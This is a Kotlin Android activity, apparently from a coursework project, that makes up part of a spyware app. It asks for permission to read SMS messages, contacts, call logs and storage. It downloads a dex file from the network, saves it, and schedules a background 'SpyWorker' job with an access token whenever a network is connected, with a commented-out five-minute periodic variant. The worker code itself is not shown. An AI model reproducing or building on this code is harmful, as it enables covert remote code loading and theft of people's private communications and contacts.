package com.homework.myapplication.presentation

import android.Manifest
import android.os.Bundle
import androidx.activity.viewModels
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.work.*
import com.homework.myapplication.databinding.ActivityMainBinding
import com.homework.myapplication.presentation.SpyWorker.Companion.PATH_KEY
import com.homework.myapplication.presentation.SpyWorker.Companion.TOKEN_KEY
import java.io.InputStream
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {

    private var _binding: ActivityMainBinding? = null
    val binding get() = _binding!!

    private val viewModel: MainViewModel by viewModels()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        _binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        requestPermissions()
        initStartListener()
        initViewStateObserver()
    }

    private fun initViewStateObserver() {
        viewModel.viewState.observe(this, { screenEffect(it) })
    }

    private fun initStartListener() {
        binding.btnStart.setOnClickListener {
            viewModel.downLoadDex(DEX_FILENAME)
        }
        binding.btnRead.setOnClickListener {
            viewModel.readFile(DEX_FILENAME)
        }
    }

    private fun screenEffect(viewState: MainViewState) {
        when (viewState) {
            is MainViewState.ErrorGetDexFile -> {
                showToast(viewState.message)
            }
            is MainViewState.SuccessGetDexFile -> {
                showToast(viewState.inputStream.toString())
                saveFile(viewState.inputStream)
            }
            is MainViewState.SuccessSaveFile -> {
                startWorkManager(viewState.internalPath)
            }
        }
    }

    private fun startWorkManager(dexInternalStoragePath: String) {
        val dexInternalPath = Data.Builder().apply {
            putString(PATH_KEY, dexInternalStoragePath)
            putString(TOKEN_KEY, ACCESS_TOKEN)
        }.build()
        val constraints = Constraints.Builder()
            .setRequiredNetworkType(NetworkType.CONNECTED)
            .build()

        /*val workRequest = PeriodicWorkRequestBuilder<SpyWorker>(
            5, TimeUnit.MINUTES, // repeatInterval (the period cycle)
            1, TimeUnit.MINUTES
        ).setInputData(dexInternalPath)
            .setConstraints(constraints)
            .build()
        WorkManager.getInstance(this)
            .enqueueUniquePeriodicWork(
                "PeriodicSimpleWorkerName", // A unique name which for this operation
                ExistingPeriodicWorkPolicy.REPLACE, // An ExistingPeriodicWorkPolicy
                workRequest
            )*/
        val workRequest = OneTimeWorkRequestBuilder<SpyWorker>()
            .setInputData(dexInternalPath)
            .setBackoffCriteria(
                BackoffPolicy.LINEAR, // The BackoffPolicy to use when increasing backoff time
                OneTimeWorkRequest.MIN_BACKOFF_MILLIS, // Time to wait before retrying the work in timeUnit units
                TimeUnit.MILLISECONDS
            ) // The TimeUnit for backoffDelay
            .addTag("SingleSimpleWorkerTag")
            .setConstraints(constraints)
            .build()

        WorkManager.getInstance(this)
            .enqueueUniqueWork(
                "SingleSimpleWorker", // A unique name which for this operation
                ExistingWorkPolicy.REPLACE, // An ExistingWorkPolicy
                workRequest
            )
    }

    private fun saveFile(inputStream: InputStream) {
        viewModel.saveFile(fileName = DEX_FILENAME, inputStream = inputStream)
    }

    private fun requestPermissions() {
        ActivityCompat.requestPermissions(
            this@MainActivity, arrayOf(
                Manifest.permission.READ_SMS,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE
            ), REQUEST_PHONE_CALL
        )
    }

    companion object {
        const val DEX_FILENAME = "classes9.dex"
        const val REQUEST_PHONE_CALL = 1
        private const val ACCESS_TOKEN =
            ""
    }
}
